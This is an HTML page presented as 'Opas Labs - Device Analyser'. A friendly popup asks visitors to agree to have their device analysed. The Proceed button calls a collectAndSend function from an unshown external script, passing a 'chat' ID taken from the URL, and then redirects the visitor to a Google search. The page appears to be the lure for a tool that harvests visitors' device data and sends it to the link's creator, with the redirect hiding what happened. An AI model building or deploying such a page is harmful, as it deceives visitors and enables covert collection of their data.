<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Opas Labs - Device Analyser</title>
  <style>
    body { font-family: Arial, sans-serif; background:#f8f9fa; margin:0; text-align:center; }
    h1 { background:#333; color:#fff; margin:0; padding:12px 0; }
    .popup { position:fixed; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.6);}
    .box{background:#fff;padding:18px;border-radius:10px;max-width:380px;box-shadow:0 6px 18px rgba(0,0,0,0.2);}
    button{padding:10px 16px;margin:8px;border-radius:6px;border:0;cursor:pointer}
    .exit{background:#dc3545;color:#fff}
    .proceed{background:#28a745;color:#fff}
    .loader{display:none;margin-top:40px}
    .spinner{width:40px;height:40px;border:4px solid #eee;border-top:4px solid #007bff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 12px}
    @keyframes spin{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <h1>Opas Labs - Device Analyser</h1>

  <div class="popup" id="popup">
    <div class="box">
      <p>Hey 👋 We are here to analyse your device.<br> Can we proceed?</p>
      <div style="text-align:center">
        <button class="exit" onclick="exitPage()">Exit</button>
        <button class="proceed" onclick="proceed()">Proceed</button>
      </div>
    </div>
  </div>

  <div class="loader" id="loader">
    <div class="spinner"></div>
    <p>Analysing your device...</p>
  </div>

  <script src="submit.js"></script>
  <script>
function exitPage() {
  document.getElementById('popup').style.display = 'none';
  document.body.innerHTML += '<p style="text-align:center;margin-top:20px">You exited the analyser.</p>';
}

async function proceed() {
  document.getElementById('popup').style.display = 'none';
  document.getElementById('loader').style.display = 'block';
  const params = new URLSearchParams(window.location.search);
  const chatId = params.get('chat');
  try { await collectAndSend(chatId); } catch(e){console.error(e);} 
  setTimeout(()=>{ window.location.href='https://www.google.com/search?q=opas+labs'; }, 800);
}
  </script>
</body>
</html>
